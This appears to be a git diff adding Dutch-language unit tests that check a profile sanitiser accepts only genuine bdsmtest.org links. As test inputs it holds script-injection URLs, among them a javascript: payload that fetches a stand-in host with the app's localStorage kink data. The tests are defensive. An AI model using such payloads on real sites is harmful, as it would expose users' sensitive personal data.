@@ -276,6 +276,39 @@ describe("decodeAny — v1 door now frisked", () => {
   });
 });
 
+describe("sanitizeProfileFull — de BDSMTest-link is geen vrije doorgang", () => {
+  const withUrl = (bdsmtestUrl: unknown) =>
+    sanitizeProfileFull({ id: "p1", name: "Val", bdsmtestUrl })?.bdsmtestUrl;
+
+  it("laat een echte bdsmtest.org-link ongemoeid door de deur", () => {
+    expect(withUrl("https://bdsmtest.org/r/abc123")).toBe("https://bdsmtest.org/r/abc123");
+    expect(withUrl("https://www.bdsmtest.org/r/abc123")).toBe("https://www.bdsmtest.org/r/abc123");
+  });
+
+  it("weigert elk ander protocol, hoe onschuldig het zich ook voordoet", () => {
+    expect(withUrl("javascript:alert(1)")).toBeUndefined();
+    expect(withUrl("data:text/html,<script>alert(1)</script>")).toBeUndefined();
+    expect(withUrl("vbscript:msgbox(1)")).toBeUndefined();
+  });
+
+  it("weigert een vreemd domein dat zich als het origineel voordoet", () => {
+    expect(withUrl("https://bdsmtest.org.kwaadaardig.example/r/1")).toBeUndefined();
+    expect(withUrl("https://niet-bdsmtest.org/r/1")).toBeUndefined();
+    expect(withUrl("https://voorbeeld.invalid/verzamel")).toBeUndefined();
+  });
+
+  it("overleeft een geimporteerd profiel dat de link probeert binnen te smokkelen", () => {
+    const smuggled = sanitizeProfileFull({
+      id: "p2",
+      name: "Vreemde",
+      origin: "shared",
+      isImported: true,
+      bdsmtestUrl: "javascript:fetch('https://elders.invalid?d='+localStorage.getItem('kink-store'))",
+    });
+    expect(smuggled?.bdsmtestUrl).toBeUndefined();
+  });
+});
+
 describe("parseBdsmtestOutput — flood control", () => {
   it("caps a hostile paste at 100 rows and 64-char roles", () => {
     const flood = Array.from({ length: 5_000 }, (_, i) => `${i % 101}% ${"R".repeat(500)}${i}`).join("\n");
